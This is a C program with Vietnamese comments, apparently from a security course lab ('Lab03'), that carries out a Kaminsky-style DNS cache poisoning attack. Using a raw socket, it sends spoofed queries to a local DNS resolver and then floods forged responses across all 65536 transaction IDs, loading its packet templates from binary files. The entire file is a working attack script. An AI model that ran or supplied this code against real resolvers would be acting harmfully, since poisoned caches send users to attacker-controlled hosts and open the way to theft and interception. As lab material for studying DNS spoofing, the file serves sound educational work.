/* Lab03 - flood DNS Response gia mao (Kaminsky).
 * Doc ip_req.bin + ip_resp.bin, gui query roi flood 65536 Transaction ID.
 */
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>

static int read_file(const char *path, unsigned char *buf, int max) {
    FILE *f = fopen(path, "rb");
    if (!f) {
        perror(path);
        return -1;
    }
    int n = (int)fread(buf, 1, max, f);
    fclose(f);
    return n;
}

int main(int argc, char **argv) {
    unsigned char req[4096], resp[4096];
    int req_len = read_file("ip_req.bin", req, sizeof(req));
    int resp_len = read_file("ip_resp.bin", resp, sizeof(resp));
    if (req_len < 28 || resp_len < 28) {
        fprintf(stderr, "Khong doc duoc ip_req.bin / ip_resp.bin\n");
        return 1;
    }

    int req_dns = ((req[0] & 0x0F) * 4) + 8;
    int resp_dns = ((resp[0] & 0x0F) * 4) + 8;

    struct sockaddr_in dst;
    memset(&dst, 0, sizeof(dst));
    dst.sin_family = AF_INET;
    dst.sin_port = htons(53);
    memcpy(&dst.sin_addr.s_addr, req + 16, 4); /* IP dich cua query = Local DNS */

    int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (s < 0) {
        perror("socket");
        return 1;
    }
    int one = 1;
    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("IP_HDRINCL");
        return 1;
    }

    int rounds = (argc > 1) ? atoi(argv[1]) : 10;
    srand((unsigned)time(NULL));

    for (int r = 0; r < rounds; r++) {
        unsigned short qid = (unsigned short)rand();
        req[req_dns] = (unsigned char)(qid >> 8);
        req[req_dns + 1] = (unsigned char)(qid & 0xFF);
        if (sendto(s, req, req_len, 0, (struct sockaddr *)&dst, sizeof(dst)) < 0) {
            perror("send query");
        }
        usleep(3000);

        for (int id = 0; id < 65536; id++) {
            resp[resp_dns] = (unsigned char)(id >> 8);
            resp[resp_dns + 1] = (unsigned char)(id & 0xFF);
            sendto(s, resp, resp_len, 0, (struct sockaddr *)&dst, sizeof(dst));
        }
        fprintf(stderr, "round %d/%d: query id=%u, flooded 65536 responses\n",
                r + 1, rounds, qid);
        usleep(20000);
    }
    fprintf(stderr, "done\n");
    return 0;
}
